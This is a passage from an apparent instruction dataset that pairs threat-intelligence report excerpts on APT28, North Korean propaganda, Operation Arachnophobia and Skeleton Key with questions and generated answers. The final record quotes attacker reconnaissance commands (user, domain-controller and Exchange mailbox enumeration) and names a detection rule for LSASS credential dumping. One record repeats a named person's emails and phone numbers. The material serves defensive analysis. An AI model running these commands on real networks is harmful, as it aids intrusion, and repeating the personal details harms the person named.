http://www.outsideonline.com/outdoor-adventure/politics/Did-North-Korea-Kidnap-This-AmericanHiker.html?utm_content=buffer6bd46&utm_medium=social&utm_source=twitter.com&utm_campaign=buffer\n186 http://m.us.wsj.com/articles/tokyo-to-lift-some-sanctions-on-pyongyang-1404354699?mobile=y\n187 http://www.nytimes.com/2013/10/02/world/asia/northern-spy-lifts-cloak-on-koreas-deadly-rivalry.html?pagewanted=2\n188 http://www.kccoc.org/home/?mid=eng_kccoc_info_korea&document_srl=3223&sort_index=readed_count&order_type=desc\n189 http://www.washingtonpost.com/world/prominent-n-korean-defector-acquitted-of-espionage-by-s-korean-court/2013/08/22/642b3712-0b1911e3-89fe-abb4a5067014_story.html\n190 https://www.usnwc.edu/getattachment/8e487165-a3ef-4ebc-83ce-0ddd7898e16a/The-Republic-of-Korea-s-Counter-asymmetric-Strateg\n191 http://www.reddit.com/r/NorthKoreaNews/comments/296ryd/i_am_dr_andrei_lankov_i_studied_in_north_korea/\nrecruitment, cyber mobilization, and to instill fear in a target population. Cyber-psychological operations may also include mental suggestion using technology as a delivery mechanism for subliminal cues. It is unknown whether North Korea possesses this capability.192\nNorth Korean citizens have access to state-approved social networks on the Kwangmyong.193\nThe regime has a limited overt social media presence on the Internet. Some of the known social media platforms employed by the regime include Twitter, Facebook, and YouTube. The YouTube channel North Korea Today, operated by user rodrigorojo1, features news clips from North Korea. It is unclear whether this channel is officially sanctioned.195 The North Korea Today YouTube channel also has corresponding profiles on Twitter196 and Facebook.197\n192 http://fmso.leavenworth.army.mil/documents/new-psyop.pdf\n193 http://www.austinchronicle.com/daily/sxsw/2013-03-11/social-media-in-north-korea/\n194 http://instagram.com/p/WpcJs1OCkb/\n195 https://www.youtube.com/user/rodrigorojo1\n196 https://twitter.com/NorthKoreaT0day\n197 https://www.facebook.com/pages/Korean-Central-Television/380193555435568?fref=ts\nThe Uriminzokkiri website, known for pushing juche ideology and anti-American and anti-South Korean messages, has accompanying social media profiles on YouTube,199 Google+,200 and Facebook.201 It also has Twitter profiles in both Korean202 and English.203\n198 https://www.youtube.com/user/rodrigorojo1\n199 https://www.youtube.com/user/uriminzokkiri\n200 https://plus.google.com/u/0/112306344682887627095\n201 https://www.facebook.com/pages/Uriminzokkiri/124452740935216\n202 https://twitter.com/uriminzok\n203 https://twitter.com/uriminzok_engl\n204 https://www.youtube.com/user/uriminzokkiri/featured\n205 https://www.facebook.com/pages/Uriminzokkiri/124452740935216\nNorth Korean propaganda208 is used for several purposes: to enforce the ideals of allies and sympathizers, to frame North Korea in a favorable light to outsiders, to sensationalize the regime's perceived self-reliance and military prowess, and to shield its own citizens from the outside world.209 Juche ideology and indoctrination of the regime's youth ensure support of the local population. North Koreans accept military duty as an honor and strive to excel in their service to the regime. In the spirit of juche, the regime uses disinformation to \"hide lapses or tout accomplishments that may have never been\nIn the spirit of juche, the regime uses disinformation to \"hide lapses or tout accomplishments that may have never been achieved.\"\n206 https://www.facebook.com/pages/Uriminzokkiri/124452740935216\n207 https://twitter.com/uriminzok_engl\n208 http://www.ncix.gov/publications/archives/docs/NORTH_KOREA_AND_FOREIGN_IT.pdf\n209 http://fas.org/irp/eprint/cno-dprk.pdf\nachieved.\"210 Limiting citizen access to the outside world by instituting the Kwangmyong intranet, North Korea ensures its citizens are not exposed to outside information that is counterproductive to citizen indoctrination or in conflict with juche ideals. North Korea portrays the West, particularly the United States, as an enemy. The regime uses this strategy of shifting the population's negative sentiments toward an external entity to keep its citizens ignorant of North Korea's own economic hardship, regime brutality, and systemic incompetence.211 For example, prior to Kim Jong Il's death in 2011, North Korean media altered photos of their \"Dear Leader\" to make him appear younger and healthier than he really was. This became obvious when the altered photos were compared to those taken by Western media around the same time.212\nAccording to Dr. Andrei Lankov, \"North Koreans now have a much better understanding of what is going on in the outside than they did before. This is largely thanks to the spread of DVDs and video content in the country, but also because some of them have been to China and talk about what they have seen\u2026many [of] them sincerely believe that the United States remains ready to attack at any moment and that Japan is an incurably aggressive place\u2026nearly all of them swallow the official propaganda myths about the Korean War being started by the 'American Imperialists' who invaded them. Hence, they see the outside world as an inherently dangerous place.\"213 Some human rights groups seek to reach out to North Korean citizens and break them from this isolation. In August 2014, the New York-based charity Human Rights Foundation sponsored a hackathon in San Francisco called \"Hack North Korea\" to find new ways to get information in, out, and around North Korea. The event brought together many programmers, human rights campaigners, and defectors.214\nNorth Korea even uses \"trolling\" as a PSYOP tactic. On the Internet, \"trolls\" are users who post messages that are often crass, controversial, inflammatory, or offensive, in order to evoke a strong reaction or influence a reader's opinion. Often, the motivation for trolling is simply for the troll's enjoyment. The rude and offensive trolling tactics are in stark contrast to traditional forms of persuasive rhetoric. However, North Korea reportedly utilizes over 200 military intelligence operatives to troll South Korean message boards and social media pages with pro-North Korean sentiments.215 Matt Rhoades, director of the cyberspace and security program at the Truman National Security Project, said, \"North Korea's cyber-development is almost just a new harassment mechanism for them, a low-cost, asymmetric method to harass its neighbor in the south\u2026\"216\nLeveraging the cyber and intelligence resources noted above, North Korea's psychological operations serve an important strategic role. The ability to influence outsiders, while effectively isolating its own population from most outside influence, allows North Korea to remain an enigma. Additionally, in line with its PSYOP tactics, North Korea may strategically take credit for cyber attacks that were, in reality, launched by another entity. Whether the targeted entity blames\nNorth Korea for the attacks, or the regime simply takes credit for an attack that has not yet been attributed, several PSYOP goals can come into play. First, to claim credit for an attack amplifies the impact of a show of force, particularly if South Korea is the target. This tactic can be used to stir sentiments in order to provoke a reaction. Second, North Korea may lay claim to responsibility for an attack that exceeds its capabilities in order to seem more technologically advanced and more capable. Third, any success, or the appearance thereof, enforces the juche ideal of regime self-sufficiency. Finally, North Korea may act as a scapegoat and claim credit for a cyber attack of an ally such as China so the attack is not attributed to the real actors.217\n210 http://www.ists.dartmouth.edu/docs/cyberwarfare.pdf\n211 http://docs.house.gov/meetings/AS/AS00/20140402/101985/HHRG-113-AS00-Wstate-ScaparrottiUSAC-20140402.pdf\n212 https://www.strategypage.com/htmw/htmurph/articles/20131106.aspx\n213 http://www.reddit.com/r/NorthKoreaNews/comments/296ryd/i_am_dr_andrei_lankov_i_studied_in_north_korea/\n214 http://www.northkoreatech.org/2014/08/05/hack-north-korea-focuses-silicon-valley-on-information-flow/\n215 http://www.strategypage.com/htmw/htiw/articles/20131213.aspx\n216 http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/4\n\nHow does North Korea leverage the cyber realm for psychological operations, and what tactics do they employ to achieve their goals?",
    "output": "North Korea leverages the cyber realm for psychological operations through various tactics including the distribution of propaganda via traditional media outlets, websites, and social media. These operations are often politically focused and aim to manipulate public sentiment. North Korea's Unit 204 is responsible for cyber-psychological operations, which require speed, precision, and creativity. They exploit the rapid spread of unverified news stories through social media and other electronic communications to achieve their objectives, such as recruitment, cyber mobilization, and instilling fear in target populations. Additionally, they may use mental suggestion and subliminal cues, although it is unclear if North Korea possesses this capability.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Persona #2:\nAbunasar Khan also maintains the aliases \"agnosticon\"95 and \"agnostic\"96 in addition to the email addresses abunasar@yahoo. com and abunasar@army.com. He has been previously associated97with VPSNOC & Digital Linx. An April 2012 Whois registrant record for the domain zeusadnetwork.com98 includes the first and last name Khan along with the same (925) 665-1427 phone number seen within the Digial Linx Hosting domains.\nKhan registered a variety of domains, many of which use his abunasar.net99 for name services and abunasar.yahoo.com within the Start of Authority (SOA) records. For example a July 2014 record (Figure 19) for defiantmarketing.com100 and an August 2013 record (Figure 20) for ns2.vpsnoc.com both maintain these references.\n95 http://www.blackhatworld.com/blackhat-seo/members/32481-agnosticon.html\n96 http://www.redlinegti.com/forum/viewtopic.php?f=3&t=41719&p=401115\n97 http://www.webhostingtalk.com/showthread.php?t=723658\n98 http://whois.domaintools.com/zeusadnetwork.com\n99 http://whois.domaintools.com/abunasar.net\n100 http://bgp.he.net/dns/defiantmarketing.com\nAbunasar Khan registered abunasar.net and previously (May 2007) and maintained whitehate.org101, which have both been used to demonstrate an affinity for and alignment with AntiSec and Anonymous movements.102 The abunasar.net website prominently displays ascii art of the term \"antisec\" with antisec related content \"Blend in. Get trusted. Trust nobody. Own everybody. Disclose nothing. Destroy everything. Take back the scene.\" This is a shared affinity that is also reflected amongst with the culture of Tranchulas employees.103 104 105 The pure.whitehate.org domain has also been previously associated with Khan, examples can be found within #phrack and #darknet IRC sessions.106 107\nIronically, in February 2011, Khan's Rootkit.com user profile was compromised revealing his profile's username, password hash, email (abunasar@army.com), and the registration IP address of 202.125.143.67 (Islamabad, Pakistan).108 During his registration, Khan specified the name \"anony mo us\" when registering the profile. As of 16 August 2013, a Pastebin post contained details of a customer database compromise for nowclothing.pk, which included Khan's name, email abunasar@army.com, and cell phone number 03215488881.109 110\nResearch of the 03215488881 cell phone number yields a user profile \"abunasark\" in an April 2009 posting.111 Khan posts pictures of his blue Baleno and includes another phone number 03234764838.112 In a secondary profile user \"Ak\" uses the same cell phone number 03215488881 in a 2009 sales posting for a 2004 blue Baleno.113 114\n101 https://whois.domaintools.com/whitehate.org\n102 https://whois.domaintools.com/abunasar.net\n103 https://www.facebook.com/media/set/?set=a.542485719112184.135023.132987340062026&type=3\n104 http://youtube.com/watch?v=w3DjOuEI0vs.mov\n105 Digital Appendix 3: Screenshot Archives (youtube.com/watch?v=w3DjOuEI0vs.mov)\n106 http://pastebin.com/rqVGqh1q\n107 http://shootingsawk.lescigales.org/misc/owneddarknet.txt\n108 https://dazzlepod.com/rootkit/?page=284\n109 http://pastebin.com/ktR3qM3K\n110 Digital Appendix 3: Screenshot Archives (pastebin.com/ktR3qM3K.png)\n111 http://www.pakwheels.com/forums/user/abunasark\n112 http://www.pakwheels.com/forums/members-member-rides/99428-white-baleno-not-anymore-comments-please-p-4\n113 http://www.motors.pk/ak-22.htm\n114 http://www.motors.pk/used-cars/suzuki-baleno-2004-for-sale-in-islamabad-22.htm\nKhan's affinity for Suzuki Baleno cars is made obvious in a May 2009 registration for clubaleno.co.uk that was registered by Khan at VPSNOC using the name services of ns1.abunasar.net and ns2.abunasar.net with a SOA record of abunasar.yahoo.com.115 116 Later in a June 2009 posting, Khan using the alias \"agnostic\" attempts to sell the domain clubaleno.co.uk and uses his abunasar@ army.com email address as a point of contact.117\nKhan is also observed using the alias \"agnosticon\" and a Toyota Racing Development avitar within posts to blackhatworld.com and again within a 2011 post where he posts a cpanel error that also includes his \"abunasar\" username within system output.118\nThe Google+ profile for Khan119 reveals established social network links to a Team Lead for Penetration Testing at Tranchulas and a Digital Linx employee Shoaib Riaz120 who also maintains a social network association with the Digital Linx founder Muhammad Nasser Bhatti.121\n115 http://www.sitetrail.com/clubaleno.co.uk\n116 http://dawhois.com/site/clubaleno.co.uk.html\n117 http://www.redlinegti.com/forum/viewtopic.php?f=3&t=41719&p=401115\n118 http://forums.cpanel.net/f5/help-yum-broke-rpm-db-broke-somehow-httpd-wont-start-238511.html\n119 https://plus.google.com/103436628630566104748/posts\n120 https://plus.google.com/105059395104464629441/about\n121 https://plus.google.com/105855064276291727409/posts\nQ: How did Abunasar Khan's online activities and domain registrations reveal his involvement in various hacking communities, and how might this information be used to track and mitigate future threats from Operation Arachnophobia?",
    "output": "Abunasar Khan's online activities and domain registrations revealed his involvement in various hacking communities through several indicators. Firstly, he registered domains such as abunasar.net and whitehate.org, which displayed content aligned with AntiSec and Anonymous movements. These domains contained ascii art and phrases like 'Blend in. Get trusted. Trust nobody. Own everybody. Disclose nothing. Destroy everything. Take back the scene,' indicating his affinity for these movements. Additionally, Khan's user profiles on platforms like Rootkit.com and Pastebin were compromised, revealing personal information such as his email addresses (abunasar@army.com) and phone numbers. His social media profiles, including Google+, showed connections to individuals associated with penetration testing teams and companies like Tranchulas and Digital Linx. This information can be used to track and mitigate future threats from Operation Arachnophobia by monitoring the activities of these domains, tracking the social networks of known associates, and analyzing any compromised data for further leads.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Background\nIn early September 2023, CERT-UA APT28 was attempting to use new malware named Headlace to access a critical energy infrastructure entity in Ukraine. This involved APT28 using the Mockbin and Mocky API websites to stage malicious archives retrieved by Javascript droppers. In late September 2023, Zscaler a similar campaign targeting the theft of NTLM hashes from victims in Poland, Austria and Belgium by using adult-themed lures and the Mockbin API for data extraction.\nIn late 2023, X-Force uncovered eight lure documents created between early August and early December 2023 likely leveraged in crafted to ultimately distribute ITG05's Headlace backdoor. X-Force research confirmed the majority of the files are directly derived from publicly available official documents created by the Bank of Israel, the U.S. Congressional Research Service, the United Nations, the European Parliament, the French digital education service Cahier de Pr\u00e9pa and the Ukraine-based Razumkov Centre think tank.\nThe remaining lures appear to be internal documents belonging to, or associated with, what appears to be legal amendments to a Turkish manual regarding technical installations, and interstate agreements facilitated by the Joint Intergovernmental Commission between the Republic of Azerbaijan and\nthe Republic of Belarus on Economic Cooperation. Of note, the majority of the lure documents contents feature news, updates or information regarding developments in Ukraine and the Levant.\nThe use of official documents as lure material is a departure from ITG05 activity featuring the delivery of the Headlace backdoor, which featured adult-themed material to engender victim engagement. This change in lure content may be indicative of ITG05's increased emphasis on a unique target audience whose interests would prompt interaction with material impacting emerging policy creation. State-sponsored cyber capabilities will likely continue to be leveraged to furnish domestic decision-makers with exclusive access to the political resolve and resource priorities of the IC and individual states.\n\nAnswer this question based on the above context: Why did ITG05 shift from using adult-themed material to official documents as lure content for delivering the Headlace backdoor? How does this change reflect on their targeting strategy and potential objectives?",
    "output": "ITG05 shifted from using adult-themed material to official documents as lure content to better engage a unique target audience interested in policy creation and political developments. This change suggests an increased emphasis on targeting individuals who are likely to interact with material that impacts emerging policies. By using documents from reputable sources such as the Bank of Israel, the U.S. Congressional Research Service, and the United Nations, ITG05 aims to attract victims who are involved in decision-making processes or have access to sensitive information. This strategy aligns with the objective of state-sponsored cyber capabilities to provide domestic decision-makers with exclusive insights into the political resolve and resource priorities of international communities and individual states.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the NetTraveler APT maintain persistence on infected systems?",
    "output": "To understand how the NetTraveler APT maintains persistence, we first need to grasp what persistence means in the context of cybersecurity. Persistence refers to the techniques used by adversaries to maintain their foothold on compromised systems despite interruptions such as system restarts or credential changes. This can involve modifying legitimate code, adding startup code, or other actions that ensure continued access. In the case of the NetTraveler APT, persistence is achieved through the installation of malware components that are designed to automatically start upon system boot. Specifically, the malware uses compression techniques and a fail-safe protocol to ensure that uploaded data is safely transferred to the attacker's command and control (C2) servers. Furthermore, the NetTraveler backdoor is configured to exfiltrate common file types and can be extended to steal other file types, indicating a sophisticated level of persistence. Additionally, the use of multiple C2 servers and the ability to update the malware with new modules suggest that the attackers are actively maintaining their foothold on compromised systems. Overall, the NetTraveler APT's persistence mechanisms allow it to maintain a long-term presence on infected systems, enabling the attackers to continuously exfiltrate sensitive data.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: ThreatConnect reviews activity targeting Bellingcat, a key contributor in the MH17 investigation.\nIntroduction\nSince posting about the (<https://threatconnect.com/blog/tapping-into-democratic-national-committee/>)DNC hack, each time we published a blog post on a BEAR-based topic we thought it was going to be our last. But like the Death Star's gravitational pull, the story keeps drawing us back in as new information comes to light. Following our post on (<https://threatconnect.com/blog/does-a-bear-leak-in-the-woods/>)DCLeaks as a Russian influence operation, (<https://www.bellingcat.com/>)Bellingcat founder (<https://www.bellingcat.com/author/eliothiggins/>)Eliot Higgins reached out to us. Bellingcat, a group of citizen investigative journalists, has published articles critical of Russia and has been a key contributor to the international investigation of the shootdown of (<https://en.wikipedia.org/wiki/Malaysia_Airlines_Flight_17>)Malaysian Airlines Flight 17 (MH17) over Ukraine in 2014.\nHiggins shared data with ThreatConnect that indicates Bellingcat has come under sustained targeting by Russian threat actors, which allowed us to identify a 2015 spearphishing campaign that is consistent with FANCY BEAR's tactics, techniques, and procedures. We also analyzed a February 2016 attack by CyberBerkut \u2014 a group claiming to be pro-Russian Ukrainian hacktivists but also a suspected front for Moscow \u2014 against Russia-based Bellingcat contributor (<https://twitter.com/RuslanLeviev>)Ruslan Leviev, where (<https://threatconnect.com/blog/fancy-bear-anti-doping-agency-phishing/>)CyberBerkut defaced the Bellingcat website and leaked Leviev's personal details. As evidenced by these efforts and the attack on the World Anti-Doping Agency, organizations that negatively impact Russia's image can expect Russian cyber operations intended to retaliate publicly or privately, influence, or otherwise maliciously affect them. The (<http://www.activeresponse.org/the-diamond-model/>)Diamond Model below summarizes the activity that Bellingcat experienced.\nQ: How did the tactics, techniques, and procedures (TTPs) employed by FANCY BEAR in the 2015 spearphishing campaign against Bellingcat align with their typical modus operandi? Additionally, what insights can be drawn from the attack on Bellingcat contributor Ruslan Leviev by CyberBerkut in February 2016 regarding the broader strategy of Russian cyber operations?",
    "output": "The 2015 spearphishing campaign against Bellingcat was consistent with FANCY BEAR's known TTPs, indicating a pattern of targeted and sophisticated attacks aimed at compromising high-value targets. This consistency underscores the threat actor's ability to leverage advanced techniques to infiltrate and gather sensitive information. Furthermore, the attack on Ruslan Leviev by CyberBerkut, which involved defacing the Bellingcat website and leaking personal details, highlights a broader strategy of Russian cyber operations. These operations are designed to retaliate against organizations that negatively impact Russia's image, either through public shaming or private influence. Such actions demonstrate the multifaceted approach of Russian threat actors, combining both technical prowess and psychological warfare to achieve their objectives.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Contributor: Nikolas Tsapkis\nOn January 12, 2015, Dell Secureworks blogged about a tool (Trojan.Skelky) that allows attackers to \"use a password of their choosing to authenticate as any user.\u2020The Skelky (from skeleton key) tool is deployed when an attacker gains access to a victim's network; the attackers may also utilize other tools and elements in their attack.\nSymantec has analyzed Trojan.Skelky and found that it may be linked to the Backdoor.Winnti malware family. The attackers behind the Trojan.Skelky campaign appear to have been using the malware in conjunction with this back door threat. It's unclear if the malware family Backdoor.Winnti is used by one attack group or many groups.\nDuring our research, we also found that Trojan.Skelky has been active over the past two years. Within this timeframe, we have seen new variants and a consistent hashed password value.\n\nHow does the Trojan.Skelky tool facilitate unauthorized access within a compromised network, and what is its connection to the Backdoor.Winnti malware family? Additionally, discuss the implications of the consistent hashed password value observed in different variants of Trojan.Skelky.",
    "output": "The Trojan.Skelky tool allows attackers to use a password of their choosing to authenticate as any user within a compromised network. This capability effectively acts as a 'skeleton key,' providing broad access to various accounts and systems. Symantec's analysis suggests that Trojan.Skelky is linked to the Backdoor.Winnti malware family, indicating that these tools may be part of a coordinated attack strategy. The consistent hashed password value observed across different variants of Trojan.Skelky over a two-year period suggests that the attackers have maintained a specific methodology for authentication, possibly to ensure persistent access or to simplify the management of their operations. This consistency could also imply that the same group or closely related groups are responsible for deploying these variants.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: OVERVIEW\nOn December 29, 2016, the Department of Homeland Security (DHS) and Federal Bureau of Investigation (FBI) released a Joint Analysis Report confirming FireEye's long held public assessment that the Russian Government sponsors APT28. Since at least 2007, APT28 has engaged in extensive operations in support of Russian strategic interests. The group, almost certainly compromised of a sophisticated and prolific set of developers and operators, has historically collected intelligence on defense and geopolitical issues. APT28 espionage activity has primarily targeted entities in the U.S., Europe, and the countries of the former Soviet Union, including governments and militaries, defense attaches, media entities, and dissidents and figures opposed to the current Russian Government.\nOver the past two years, Russia appears to have increasingly leveraged APT28 to conduct information operations commensurate with broader strategic military doctrine. After compromising a victim organization, APT28 will steal internal data that is then leaked to further political narratives aligned with Russian interests. To date these have included the conflict in Syria, NATO-Ukraine relations, the European Union refugee and migrant crisis, the 2016 Olympics and Paralympics Russian athlete doping scandal, public accusations regarding Russian state-sponsored hacking, and the 2016 U.S. presidential election.\nTABLE 1: APT28 TARGETING OF POLITICAL ENTITIES AND INTRUSION ACTIVITY\n1. Gauquelin, Blaise. \"La Russie soup\u00e7onn\u00e9e d'\u00eatre responsable d'un piratage informatique contre l'OSCE.\" Le Monde. 28 Dec. 2016. Web. 29 Dec. 2016.\n2. Trend Micro refers to activity corresponding to FireEye's APT28 as \"Pawn Storm.\"\n3. Hacquebord Feike. \"Pawn Storm Targets German Christian Democratic Union.\" Trend Micro. 11 May 2016. Web. 29 Dec. 2016.\n4. Hacquebord Feike. \"Pawn Storm's Domestic Spying Campaign Revealed; Ukraine and US Top Global Targets.\" TrendLabs Security Intelligence Blog, Trend Micro. 18 August 2015. Web. 29 Dec.  2016. 5. \"Neuer Hackerangriff auf Bundespolitiker / BSI warnt Parteien vor Cyberangriffen.\" Westdeutscher Rundfunk. 20 Sept. 2016. Web. 29 Dec. 2016.\n6. \"Russia 'was Behind German Parliament Hack.'\" The BBC. 13 May 2016. Web. 29 Dec. 2016.\n7, Kharouni, Loucif. et al. \"Operation Pawn Storm: Using Decoys to Evade Detection.\" Trend Micro. 22 Oct. 2014. Web. 3 Jan. 2017.\nSince 2014, APT28 network activity has likely supported information operations designed to influence the domestic politics of foreign nations. Some of these operations have involved the disruption and defacement of websites, false flag operations using false hacktivist personas, and the theft of data that was later leaked publicly online.\nTable 2 highlights incidents in which victims suffered a compromise that FireEye iSIGHT Intelligence, other authorities, or the victims themselves later attributed to the group we track as APT28. All of these operations have aimed to achieve a similar objective: securing a political outcome beneficial to Russia.\nTABLE 2: APT28 NETWORK ACTIVITY HAS LIKELY SUPPORTED INFORMATION OPERATIONS\n8. \"WADA Confirms Attack by Russian Cyber Espionage Group.\" World Anti-Doping Agency. 13 Sept. 2016. Web. 29 Dec. 2016.\n9. Fancy Bears' HT (fancybears). \"@AnonPress Greetings. We hacked #WADA. We have Proof of American Athletes taking doping. Fancybear.net.\" 12 Sept. 2016, 4:12 PM. Tweet.\n10. CrowdStrike refers to activity corresponding to FireEye's APT28 and APT29 as \"Fancy Bear\" and \"Cozy Bear,\" respectively.\n11. \"Nakashima, Ellen. \"Cyber Researchers Confirm Russian Government Hack of Democratic National Committee.\" The Washington Post. 20 June 2016. Web. 29 Dec. 2016.\n12. \"Rid, Thomas. \"All Signs Point to Russia Being Behind the DNC Hack.\" Motherboard, Vice. 25 July 2016. Web. 29 Dec. 2016.\n13.  \"Bennett, Cory. \"Guccifer 2.0 Drops More DNC Docs.\" Politico. 13 Sept. 2016. Web. 2 Jan. 2017. <>\n14. Perlroth, Nicole. Shear, Michael D. \"Private Security Group Says Russia was Behind John Podesta's Email Hack.\" The New York Times. 21 Oct. 2016. Web. 2 Jan. 2017.\n15. \"Franceschi-Bicchierai, Lorenzo. \"How Hackers Broke Into John Podesta and Colin Powell's Gmail Accounts.\" 20 Oct. 2016. Web. 2 Jan. 2017.\n16. \"Nakashima, Ellen. \"FBI Probes Suspected Breach of Another Democratic Organization by Russian Hackers.\" The Washington Post. 29 July 2016. Web. 29 Dec. 2016. 17. \"Pelosi, Nancy. \"DCCC Cyber Breach.\" 13 August 2016. Email. U.S. House of Representatives. Washington, DC. Politico. Web. 29 Dec. 2016.\n18. \"Lipton, Eric. Shane, Scott. \"Democratic House Candidates Were Also Targets of Russian Hacking.\" The New York Times. 13 Dec. 2016. Web. 29 Dec. 2016.\n19. Ibid.\nMedium Headline: Investigating APT28 at the World Anti-Doping Agency\nAs news of the DNC breach spread, APT28 was preparing for another set of operations: countering the condemnation that Russia was facing after doping allegations and a threatened blanket ban of the Russian team from the upcoming Rio Games. Russia, like many nations, has long viewed success in the Olympic Games as a source of national prestige and soft power on the world stage. The doping allegations and prospective ban from the Games further ostracized Russia, and likely provided motivation to actively counter the allegations by attempting to discredit anti-doping agencies and policies. Our investigation of APT28's compromise of WADA's network, and our observations of the surrounding events reveal how Russia sought to counteract a damaging narrative and delegitimize the institutions leveling criticism.\nVery Small Headline: SEP 15-30\n\"Fancy Bears' Hack Team\" releases five additional batches of medical files for high-profile athletes from multiple nations, including the U.S., which had applied for and received Therapeutic Use Exemptions (TUEs) for medications otherwise banned from competition.36\nClaiming to support \"fair play and clean sport,\" Fancy Bears' Hack team calls TUEs \"licenses for doping.\"37\nBased on this timeline of leak and threatened leak activity, as well as strikingly similar characteristics and distribution methods shared between @anpoland and \"Fancy Bears' Hack Team,\" the same operators are highly likely behind the two personas. WADA officials, citing evidence provided by law enforcement, stated that the threat activity originated in Russia, possibly in retaliation\nfor WADA's exposure of Russia's expansive, state-run doping.38 The statement prompted denials from the Russian Government, with Russian sports minister Vitaly Mutko asking, \"How can you prove that the hackers are Russian? You blame Russia for everything, it is very in fashion now.\"39\n20. Gallagher, Sean. \"Guccifer 2.0 Posts DCCC Docs, Says They're From Clinton Foundation.\" Ars Technica. 4 Oct. 2016. Web. 3 Jan. 2017.\n21. \"Russian Hackers Suspected in French TV Cyberattack.\" Deutsche Welle. 6 Oct. 2015. Web. 29 Dec. 2016.\n22. Joselow, Gabe. \"Election Cyberattacks: Pro-Russia Hackers Have Been Accused in Past.\" NBC News. 3 Nov. 2016. Web. 29 Dec. 2016.\n23. Clayton, Mark. \"Ukraine Election Narrowly Avoided 'Wanton Destruction' From Hackers (+Video).\" The Christian Science Monitor. 17 June 2014. Web. 2 Jan. 2017.\n24. \"Foundation Board Media Release: WADA Strengthens Anti-Doping Worldwide.\" World Anti-Doping Agency. 18 November 2015.\n25. \"Russia State-Sponsored Doping Across Majority of Olympic Sports, Claims Report.\" The BBC. 18 July 2016. Web. 29 Dec. 2016.\n26. Macguire, Eoghan. Almasy, Steve. \"271 Russian Athletes Cleared for Rio Games.\" CNN. 5 August 2016. Web. 29 Dec. 2016.\n27. \"Cyber Security Update: WADA's Incident Response.\" World Anti-Doping Agency. 5 Oct. 2016. Web. 3 Jan. 2017. 28. \"WADA Confirms Attack by Russian Cyber Espionage Group.\" World Anti-Doping Agency. 13 Sept. 2016.\n29. \"WADA Confirms Another Batch of Athlete Data Leaked by Russian Cyber Hackers 'Fancy Bear.'\" World Anti-Doping Agency. 14 Sept. 2016. Web. 29 Dec. 2016. <>\n30. [OP PL]. \"www.tas-cas.org.\" Online video clip. YouTube. YouTube, 9 Aug. 2016. Web. 3 Jan. 2017. 31. Anonymous Poland (@anpoland). \"@Cryptomeorg @ben_rumsby @PogoWasRight @Jason_A_Murdock @Cyber_War_News @kevincollier Tomorrow will ddos WADA and publish some secret dosc.\" 11 Aug 2016 10:10 AM. Tweet.\n32. Anonymous Poland (@anpoland). \"@JoeUchill within a few days will be new attack on the WADA/Olimpic.\" 5 Sept. 2016 5:19 AM. Tweet.\n33. Fancy Bears' HT (fancybears). \"@AnonPress Greetings. We hacked #WADA. We have Proof of American Athletes taking doping. Fancybear.net.\" 34.  Ibid.\n35. \"WADA Confirms Attack by Russian Cyber Espionage Group.\"World Anti-Doping Agency.13 Sept. 2016. 36.  Russian Hackers Leak Simone Biles and Serena Williams Files.\" The BBC. 13 Sept. 2016. Web. 29 Dec. 2016.\n37. Rumsby, Ben. \"US Superstars Serena and Venus Williams and Simone Biles Given Drugs Exemption, Russian Hackers Reveal.\" The Telegraph. 14 Sept. 2016. Web. 29 Dec. 2016.\n38. Luhn, Alec.\"Fancy Bears Origins Unclear But Russia Seizes Chance to Put Boot into Wada.\" 15 Sept. 2016. Web. 29 Dec. 2016. 39. Gibson, Owen. \"Russian Sports Minister Vitaly Mutko Denies Link to Wada Hackers.\" The Guardian. 14 Sept. 2016. Web. 29 Dec. 2016.\nRead the text above and answer this question: How has APT28 evolved its tactics since 2014 to support information operations aimed at influencing the domestic politics of foreign nations?",
    "output": "Since 2014, APT28 has expanded its operations to include information operations designed to influence the domestic politics of foreign nations. These operations have involved various tactics such as the disruption and defacement of websites, false flag operations using false hacktivist personas, and the theft of data that was later leaked publicly online. These activities aim to secure political outcomes beneficial to Russia.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Discovery\nThe threat actors used native Windows binaries to enumerate the exploited server in an automated fashion. They executed commands such as:\nnet.exe user\nipconfig.exe /all\npowershell.exe (multiple commands)\nquser.exe\nThese discovery tasks like the rest of the activity observed from this threat actor was executed via the web shell.\nThey used the PowerShell module Get-WmiObject to collect the name and IP address of the domain controller.\nGet-WMIObject Win32_NTDomain | findstr DomainController\nAdditionally, we saw threat actors retrieving an email address from the compromised exchange server using the below command. This was likely done as a test.\nAdd-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn; Get-Recipient | Select Name -ExpandProperty EmailAddresses -first 1 | Select SmtpAddress | ft -hidetableheaders\"\nMedium Headline: Sigma\nLocal Accounts Discovery \u2013 (<https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_local_system_owner_account_discovery.yml>)https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/ rules/windows/process_creation/win_local_system_owner_account_discovery.yml\nLsass Memory Dump via Comsvcs DLL \u2013 (<https://github.com/SigmaHQ/sigma/blob/b81839e3ce507df925d6e583e569e1ac3a3894ab/rules/windows/process_access/sysmon_lsass_dump_comsvcs_dll.yml>)https://github.com/SigmaHQ/sigma/blob/b81839e3ce507df925d6e583e569e1ac3a3894ab/ rules/windows/process_access/sysmon_lsass_dump_comsvcs_dll.yml\nNet.exe Execution \u2013 (<https://github.com/SigmaHQ/sigma/blob/777d218adc789b7f1b146701793e78799324d87d/rules/windows/process_creation/win_susp_net_execution.yml>)https://github.com/SigmaHQ/sigma/blob/777d218adc789b7f1b146701793e78799324d87d/ rules/windows/process_creation/win_susp_net_execution.yml\nNet-exe User Account Creation \u2013 